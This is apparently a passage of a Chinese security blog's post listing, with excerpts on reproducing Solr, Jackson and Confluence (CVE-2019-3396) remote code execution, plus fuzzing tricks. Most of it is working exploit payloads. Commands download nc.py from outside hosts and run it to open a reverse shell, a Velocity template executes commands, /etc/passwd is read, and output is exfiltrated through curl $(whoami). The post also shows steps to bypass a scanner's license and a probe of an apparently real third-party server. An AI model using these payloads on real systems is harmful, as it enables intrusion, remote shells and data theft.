class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">-i</span><span class="dl">"</span><span class="p">]);</span>

<span class="o">----</span>
<span class="nx">your</span> <span class="nx">vps</span> <span class="nx">terminal</span><span class="p">:</span>

<span class="nx">nc</span> <span class="o">-</span><span class="nx">lvnp</span> <span class="mi">18080</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="mi">1111</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">python nc.py</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>
<p>即可。</p>

          <p><a href="/blog/2020/Nexus/vuln-Cve/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Apache/vuln-Cve/"><h3 class="ctitle">「vulnhub」:Apace-RCE漏洞复现总结</h3></a>
          <p><csmall>Aug 22, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="apache-solr-vuln">Apache-solr-vuln</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://192.168.137.181:8983/solr/admin/cores?indexInfo=false&amp;wt=json"</span>

<span class="o">{</span>
  <span class="s2">"responseHeader"</span>:<span class="o">{</span>
    <span class="s2">"status"</span>:0,
    <span class="s2">"QTime"</span>:0<span class="o">}</span>,
  <span class="s2">"initFailures"</span>:<span class="o">{}</span>,
  <span class="s2">"status"</span>:<span class="o">{</span>
    <span class="s2">"demo"</span>:<span class="o">{</span>
      <span class="s2">"name"</span>:<span class="s2">"demo"</span>,
      <span class="s2">"instanceDir"</span>:<span class="s2">"/var/solr/data/demo"</span>,
      <span class="s2">"dataDir"</span>:<span class="s2">"/var/solr/data/demo/data/"</span>,
      <span class="s2">"config"</span>:<span class="s2">"solrconfig.xml"</span>,
      <span class="s2">"schema"</span>:<span class="s2">"managed-schema"</span>,
      <span class="s2">"startTime"</span>:<span class="s2">"2020-08-22T01:42:03.422Z"</span>,
      <span class="s2">"uptime"</span>:51628
          <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>关键是这个<code class="language-plaintext highlighter-rouge">deomo:namel;instanceDir...</code>，修改数据包<code class="language-plaintext highlighter-rouge">Content-Type: application/json</code>，post数据修改内容：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /solr/demo/config HTTP/1.1
Host: 192.168.137.181:8983
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:79.0<span class="o">)</span> Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 259

<span class="o">{</span>
  <span class="s2">"update-queryresponsewriter"</span>: <span class="o">{</span>
    <span class="s2">"startup"</span>: <span class="s2">"lazy"</span>,
    <span class="s2">"name"</span>: <span class="s2">"velocity"</span>,
    <span class="s2">"class"</span>: <span class="s2">"solr.VelocityResponseWriter"</span>,
    <span class="s2">"template.base.dir"</span>: <span class="s2">""</span>,
    <span class="s2">"solr.resource.loader.enabled"</span>: <span class="s2">"true"</span>,
    <span class="s2">"params.resource.loader.enabled"</span>: <span class="s2">"true"</span>
  <span class="o">}</span>
<span class="o">}</span>
/////////////////////////////////////////////////////////////////////////////////////

反包：
HTTP/1.1 200 OK
Connection: close
Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 149

<span class="o">{</span>
  <span class="s2">"responseHeader"</span>:<span class="o">{</span>
    <span class="s2">"status"</span>:0,
    <span class="s2">"QTime"</span>:425<span class="o">}</span>,
  <span class="s2">"WARNING"</span>:<span class="s2">"This response format is experimental.  It is likely to change in the future."</span><span class="o">}</span>
</code></pre></div></div>
<p>rce payload:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>solr/bin4xin/select?wt<span class="o">=</span>velocity&amp;v.template<span class="o">=</span>custom&amp;v.template.custom<span class="o">=</span>%23set<span class="o">(</span><span class="nv">$x</span><span class="o">=</span>%27%27<span class="o">)</span>+%23set<span class="o">(</span><span class="nv">$rt</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.Runtime%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$chr</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.Character%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$x</span>.class.forName<span class="o">(</span>%27java.lang.String%27<span class="o">))</span>+%23set<span class="o">(</span><span class="nv">$ex</span><span class="o">=</span><span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27pwd%27<span class="o">))</span>+<span class="nv">$ex</span>.waitFor<span class="o">()</span>+%23set<span class="o">(</span><span class="nv">$out</span><span class="o">=</span><span class="nv">$ex</span>.getInputStream<span class="o">())</span>+%23foreach<span class="o">(</span><span class="nv">$i</span>+in+[1..<span class="nv">$out</span>.available<span class="o">()])</span><span class="nv">$str</span>.valueOf<span class="o">(</span><span class="nv">$chr</span>.toChars<span class="o">(</span><span class="nv">$out</span>.read<span class="o">()))</span>%23end
</code></pre></div></div>

<p>getshell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27curl%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py%27<span class="o">)</span>


wget%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py

<span class="nv">$rt</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span>%27python%20/tmp/nc.py%27<span class="o">)</span>
</code></pre></div></div>
<p>不过一般如果存在基本认证，就需要先过认证才行。</p>

<h2 id="apache-activemq-vuln">Apache ActiveMQ-vuln</h2>
<ul>
  <li>探测</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>39.99.161.182
Host is up <span class="o">(</span>0.095s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
8161/tcp open  http    Jetty 8.1.16.v20140903
|_http-server-header: Jetty<span class="o">(</span>8.1.16.v20140903<span class="o">)</span>
|_http-title: Apache ActiveMQ
</code></pre></div></div>

          <p><a href="/blog/2020/Apache/vuln-Cve/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/json/vuln-Cve/"><h3 class="ctitle">「vulnhub」:Json漏洞反序列化总结</h3></a>
          <p><csmall>Aug 14, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h1 id="区分-fastjson-和-jackson">区分 Fastjson 和 Jackson</h1>
<p>post数据包：
{“name”:”S”, “age”:21}
1
{“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}
1
这两个fastjson都不会报错，而jackson会报错，因为Jackson 因为强制key与javabean属性对齐,只能少不能多key,所以会报错。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>jackson1.xml 

&lt;beans <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.springframework.org/schema/beans"</span>
       xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
       xsi:schemaLocation<span class="o">=</span><span class="s2">"
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
"</span><span class="o">&gt;</span>
    &lt;bean <span class="nb">id</span><span class="o">=</span><span class="s2">"pb"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"java.lang.ProcessBuilder"</span><span class="o">&gt;</span>
        &lt;constructor-arg&gt;
            &lt;array&gt;
                &lt;value&gt;curl&lt;/value&gt;
		&lt;value&gt;http://47.52.233.92:8000/pc.py&lt;/value&gt;
            &lt;/array&gt;
        &lt;/constructor-arg&gt;
        &lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">"any"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"#{ pb.start() }"</span>/&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
<span class="nt">----------------------------------------------------------------------------------------------------</span>
<span class="nt">----------------------------------------------------------------------------------------------------</span>
POST /exploit HTTP/1.1
Host: 192.168.43.14:8080
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:79.0<span class="o">)</span> Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 142

<span class="o">{</span>
  <span class="s2">"param"</span>: <span class="o">[</span>
   <span class="s2">"org.springframework.context.support.FileSystemXmlApplicationContext"</span>,
   <span class="s2">"http://47.52.233.92:8000/jackson1.xml"</span>
  <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /jackson1.xml HTTP/1.1"</span> 200 -
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /jackson1.xml HTTP/1.1"</span> 200 -
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] code 404, message File not found
223.246.173.228 - - <span class="o">[</span>31/Aug/2020 16:05:12] <span class="s2">"GET /pc.py HTTP/1.1"</span> 404 -
</code></pre></div></div>
<h2 id="探测jackson">探测jackson</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jubaopen/api2/wealth/mail/getCheckCode HTTP/1.1
Host: dev.pactera.com
Content-Length: 24
DNT: 1
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10_15_6<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Accept: application/json, text/plain, <span class="k">*</span>/<span class="k">*</span>
timeStamp: 1597418145214
userId: undefined
token: undefined
deviceType: 2
Origin: http://dev.pactera.com
Referer: http://dev.pactera.com/jubaopen/weixin2/
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,en-GB<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.6
Connection: close

<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"S"</span>, <span class="s2">"age"</span>:21<span class="o">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Server: nginx/1.16.1
Date: Fri, 14 Aug 2020 15:21:32 GMT
Content-Type: application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
Connection: close
Access-Control-Allow-Origin: <span class="k">*</span>
Access-Control-Allow-Credentials: <span class="nb">true
</span>Access-Control-Allow-Methods: POST,GET,PUT,OPTIONS,DELETE,PATCH
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Content-Length: 19469

<span class="o">{</span><span class="s2">"code"</span>:null,<span class="s2">"msg"</span>:null,<span class="s2">"data"</span>:<span class="o">{</span><span class="s2">"cause"</span>:null,<span class="s2">"stackTrace"</span>:[<span class="o">{</span><span class="s2">"classLoaderName"</span>:null,<span class="s2">"moduleName"</span>:null,<span class="s2">"moduleVersion"</span>:null,<span class="s2">"methodName"</span>:<span class="s2">"parse"</span>,<span class="s2">"fileName"</span>:<span class="s2">"InternetAddress.java"</span>,<span class="s2">"lineNumber"</span>:696,<span class="s2">"nativeMethod"</span>:false,<span class="s2">"className"</span>:<span class="s2">"javax.mail.internet.InternetAddress"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"classLoaderName"</span>:null,<span class="s2">"moduleName"</span>:null,<span class="s2">"moduleVersion"</span>:null,<span class="s2">"methodName"</span>:<span class="s2">"parse"</span>,<span class="s2">"fileName"</span>:<span class="s2">"InternetAddress.java"</span>,<span class="s2">"lineNumber"</span>:655,<span class="s2">"nativeMethod"</span>:false,<span class="s2">"className"</span>:
···
···
···
methodName<span class="s2">":"</span>run<span class="s2">","</span>fileName<span class="s2">":"</span>Thread.java<span class="s2">","</span>lineNumber<span class="s2">":830,"</span>nativeMethod<span class="s2">":false,"</span>className<span class="s2">":"</span>java.lang.Thread<span class="s2">"}],"</span>message<span class="s2">":null,"</span>suppressed<span class="s2">":[],"</span>localizedMessage<span class="s2">":null}}
</span></code></pre></div></div>

          <p><a href="/blog/2020/json/vuln-Cve/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Confluence/vuln-Cve/"><h3 class="ctitle">「Src」:Confluence漏洞复现总结</h3></a>
          <p><csmall>Jul 23, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h4 id="confluence未授权rce-cve-2019-3396">Confluence未授权RCE (CVE-2019-3396)</h4>
<p>文件读取：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url:/confluence/rest/tinymce/1/macro/preview

<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"../../../../../etc/passwd"</span><span class="o">}}}</span>
</code></pre></div></div>

<h5 id="rce漏洞">RCE漏洞：</h5>
<p>生成<code class="language-plaintext highlighter-rouge">cmd.vm</code>文件放在自己的服务器上。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>cmd.vm
<span class="c">#set ($e="exp")</span>
<span class="c">#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))</span>
<span class="c">#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))</span>
<span class="c">#set($sc = $e.getClass().forName("java.util.Scanner"))</span>
<span class="c">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))</span>
<span class="c">#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))</span>
<span class="c">#if($scan.hasNext())</span>
    <span class="nv">$scan</span>.next<span class="o">()</span>
<span class="c">#end</span>
</code></pre></div></div>
<p>这个漏洞是相当于一个远程文件包含的原理，所以下面跑一个ftp然后在post包里包含，最后输出cmd执行命令即可。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">-p</span> 2121
<span class="o">[</span>I 2020-07-23 15:47:58] concurrency model: async
<span class="o">[</span>I 2020-07-23 15:47:58] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None
<span class="o">[</span>I 2020-07-23 15:47:58] passive ports: None
<span class="o">[</span>I 2020-07-23 15:47:58] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:2121, <span class="nv">pid</span><span class="o">=</span>25460 <span class="o">&lt;&lt;&lt;</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>执行命令：
<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"ftp://www.chihou.pro:2121/cmd.vm"</span>,<span class="s2">"cmd"</span>:<span class="s2">"whoami"</span><span class="o">}}}</span>

下载shell反弹：
<span class="o">{</span><span class="s2">"contentId"</span>:<span class="s2">"786457"</span>,<span class="s2">"macro"</span>:<span class="o">{</span><span class="s2">"name"</span>:<span class="s2">"widget"</span>,<span class="s2">"body"</span>:<span class="s2">""</span>,<span class="s2">"params"</span>:<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https://www.viddler.com/v/23464dc5"</span>,<span class="s2">"width"</span>:<span class="s2">"1000"</span>,<span class="s2">"height"</span>:<span class="s2">"1000"</span>,<span class="s2">"_template"</span>:<span class="s2">"ftp://www.chihou.pro:2121/cmd.vm"</span>,<span class="s2">"cmd"</span>:<span class="s2">"curl -o /tmp/nc.py ftp://www.chihou.pro:2121/nc.py"</span><span class="o">}}}</span>

<span class="s2">"python /tmp/nc.py"</span>
</code></pre></div></div>


          <p><a href="/blog/2020/Confluence/vuln-Cve/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/C-S/use/internet-Inside/"><h3 class="ctitle">「CS」:内网的渗透工具学习</h3></a>
          <p><csmall>Jun 22, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>opoos!wait plz～</li>
</ul>

          <p><a href="/blog/2020/C-S/use/internet-Inside/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/useSecTools/aq_AWVS/"><h3 class="ctitle">「安全工具」:A-Web_Vuln_Scan和aq域名爆破工具</h3></a>
          <p><csmall>Jun 21, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="aq域名工具">aq域名工具</h2>

<p>此处仅仅对于aq工具的报错进行部分记录，若存在无法解决的问题可以自行查询其他师傅的文章。</p>

<ul>
  <li>gem换源
gem安装软件之前一定要换源；</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem sources <span class="nt">--add</span> https://gems.ruby-china.com/ <span class="nt">--remove</span> https://rubygems.org/
npm config <span class="nb">set </span>registry https://registry.npm.taobao.org
</code></pre></div></div>

<ul>
  <li>依赖报错</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem <span class="nb">install </span>aquatone <span class="o">&amp;&amp;</span> npm <span class="nb">install </span>electron <span class="o">&amp;&amp;</span> npm <span class="nb">install </span>nightmare
Building native extensions. This could take a <span class="k">while</span>...
ERROR:  Error installing aquatone:
        ERROR: Failed to build gem native extension.

    current directory: /var/lib/gems/2.7.0/gems/ffi-1.13.1/ext/ffi_c
/usr/bin/ruby2.7 <span class="nt">-I</span> /usr/lib/ruby/2.7.0 <span class="nt">-r</span> ./siteconf20200713-12887-ohoa28.rb extconf.rb
mkmf.rb can<span class="s1">'t find header files for ruby at /usr/lib/ruby/include/ruby.h

You might have to install separate package for the ruby development
environment, ruby-dev or ruby-devel for example.

</span></code></pre></div></div>
<p>报什么依赖的错就安装上什么依赖，上面报的错单独拿下来，看到如下得报错。</p>

<ul>
  <li>You might have to install separate package for the ruby development environment, ruby-dev or ruby-devel for example.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>ruby-devel
把依赖安装上就可以了
</code></pre></div></div>
<p>然后重新执行：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Building native extensions. This could take a <span class="k">while</span>...
Successfully installed ffi-1.13.1
Successfully installed childprocess-0.7.1
Successfully installed multi_xml-0.6.0
When you HTTParty, you must party hard!
Successfully installed httparty-0.14.0
Successfully installed aquatone-0.5.0
Parsing documentation <span class="k">for </span>ffi-1.13.1
Installing ri documentation <span class="k">for </span>ffi-1.13.1
Parsing documentation <span class="k">for </span>childprocess-0.7.1
Installing ri documentation <span class="k">for </span>childprocess-0.7.1
Parsing documentation <span class="k">for </span>multi_xml-0.6.0
Installing ri documentation <span class="k">for </span>multi_xml-0.6.0
Parsing documentation <span class="k">for </span>httparty-0.14.0
Installing ri documentation <span class="k">for </span>httparty-0.14.0
Parsing documentation <span class="k">for </span>aquatone-0.5.0
Installing ri documentation <span class="k">for </span>aquatone-0.5.0
Done installing documentation <span class="k">for </span>ffi, childprocess, multi_xml, httparty, aquatone after 6 seconds
</code></pre></div></div>
<p>？</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+———————————————+
|export <span class="nv">LC_ALL</span><span class="o">=</span>C|
+———————————————+
</code></pre></div></div>

<ul>
  <li>npm换源
同gem:-)</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm <span class="nb">install</span> <span class="nt">-g</span> electron <span class="nt">--registry</span><span class="o">=</span>https://registry.npm.taobao.org

<span class="nv">DEBUG</span><span class="o">=</span>nightmare xvfb-run aquatone-gather <span class="nt">-d</span> ksyun.com <span class="nt">--threads</span> 10

npm <span class="nb">install</span> <span class="nt">--save</span> nightmare <span class="nt">--unsafe-perm</span><span class="o">=</span><span class="nb">true</span> <span class="nt">--allow-root</span> <span class="nt">--registry</span><span class="o">=</span>https://registry.npm.taobao.org
https://gh0st.cn/archives/2018-09-02/1
</code></pre></div></div>

<h4 id="问题">问题</h4>

<ul>
  <li>aq-gather的执行问题，报错有关于<code class="language-plaintext highlighter-rouge">nightmare</code></li>
</ul>

<p>同时这里aq存在一个问题，如果执行<code class="language-plaintext highlighter-rouge">aq-gather</code>报错那么就执行如下，就是下载一个shell脚本输出到bin文件夹下执行。</p>

<p><code class="language-plaintext highlighter-rouge">wget "https://gist.githubusercontent.com/random-robbie/beae1991e9ad139c6168c385d8a31f7d/raw/aq.sh" -O /bin/aq &amp;&amp; chmod 777 /bin/aq</code>
然后直接aq执行就可以。</p>

<ul>
  <li>aq报错:issue running aquatone:issue running aquatone</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>goroutine 6807 <span class="o">[</span>running]:
runtime.throw<span class="o">(</span>0x14dee2a, 0x21<span class="o">)</span>
</code></pre></div></div>
<p>指定参数threads和time：降低线程数和增大超时时间，这里可以自行查看一下线程数的指定参数和timeout的指定格式。</p>

<h2 id="awvs-linux安装">awvs-linux安装</h2>
<ul>
  <li>awvs13还是很香的。</li>
</ul>

<p>为了保护原始license不失效，这里尽快执行如下的命令，不然license会被修改然后就无法破解成功。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.json
root@kali:~# <span class="nb">rm</span> <span class="nt">-fr</span> /home/acunetix/.acunetix_trial/data/license/wa_data.dat
root@kali:~# <span class="nb">touch</span> /home/acunetix/.acunetix_trial/data/license/wa_data.dat
root@kali:~# chattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat
</code></pre></div></div>

<ul>
  <li>个人强烈推荐：docker版本。</li>
</ul>

<p>docker镜像下载的命令可以参考国光师傅的博客。</p>

          <p><a href="/blog/2020/useSecTools/aq_AWVS/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/learn/to/fuzz/"><h3 class="ctitle">「Fuzz」:浅谈一些模糊匹配搜集信息的技巧</h3></a>
          <p><csmall>Jun 10, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>写在文前：</p>

<blockquote>
  <p>我们在web攻防期间有很多时候有一种感觉：那就是遇到rce漏洞时，bp放包的时候有一种隐隐的感觉，有的时候bp的反包字节大小莫名其妙的怪异，有经验的老师傅就索性直接跑RCE的fuzz字典，所以本篇就日常记录一些有关于web攻防期间的一些fuzz技巧</p>
</blockquote>

<h1 id="服务器rce的fuzz技巧">服务器RCE的fuzz技巧</h1>

<ul>
  <li>Windows机器的fuzz</li>
</ul>

<p>即我们可以在关键参数后面使用管道符号和连接符fuzz命令执行实现我们的盲打：</p>

<p><code class="language-plaintext highlighter-rouge">||和&amp;</code></p>

<ul>
  <li>linux机器的fuzz</li>
</ul>

<p>同上</p>

<p><code class="language-plaintext highlighter-rouge">||和&amp;</code></p>

<ul>
  <li>Linux下过滤空格可以使用:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${IFS},$IFS,$IFS$9
</code></pre></div>    </div>
  </li>
  <li>JSON格式下的测试:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\u000awget\u0020 http://ip
</code></pre></div>    </div>
  </li>
</ul>

<p>Linux下可以包括反引号，windows下不可以。</p>

<h2 id="linux下正常测试rce">Linux下正常测试rce:</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>服务器启动web，注意需要处于监听状态下启动：

bin4xin@bin4xin<span class="s1">'s MacbookPro tools % python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

</span></code></pre></div></div>
<p>rce fuzz命令如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro tools % curl 192.168.101.51:8000/`whoami`
</span></code></pre></div></div>
<p>同时我们反过来看web日志记录：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:192.168.101.51 - - <span class="o">[</span>19/Sep/2020 13:57:25] <span class="s2">"GET /bin4xin HTTP/1.1"</span> 301 -
</code></pre></div></div>
<p>同理各位可以发散思维：</p>

<p>ping <code class="language-plaintext highlighter-rouge">whoami</code>.服务器地址</p>

<p>如上，ping、curl同样适用。</p>

<p>一些特殊字符绕过姿势:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://服务器地址/<span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>

curl http://服务器地址/<span class="si">$(</span><span class="nb">whoami</span>|base64<span class="si">)</span>

<span class="s1">'w'</span>g<span class="s1">'e'</span>t<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>服务器地址
</code></pre></div></div>
<p>各位可以自行实验在linux下的效果。</p>

<h2 id="windows探测">Windows探测:</h2>

<p>fuzz技巧是一样的，只是fuzz命令有一些区别；</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping %USERNAME%.服务器地址
<span class="nt">------</span>
<span class="o">(</span>获取计算机名<span class="o">)</span>
<span class="k">for</span> /F %x <span class="k">in</span> <span class="o">(</span><span class="s1">'whoami'</span><span class="o">)</span> <span class="k">do </span>start http://服务器地址/%x
<span class="nt">------</span>
<span class="o">(</span>获取用户名称<span class="o">)</span>
<span class="k">for</span> /F <span class="s2">"delims=</span><span class="se">\ </span><span class="s2">tokens=2"</span> %i <span class="k">in</span> <span class="o">(</span><span class="s1">'whoami'</span><span class="o">)</span> <span class="k">do </span>ping <span class="nt">-n</span> 1 %i.服务器地址
<span class="nt">------</span>
测试邮箱:<span class="sb">`</span>wget%209服务器地址/xxxx<span class="sb">`</span>@qq.com

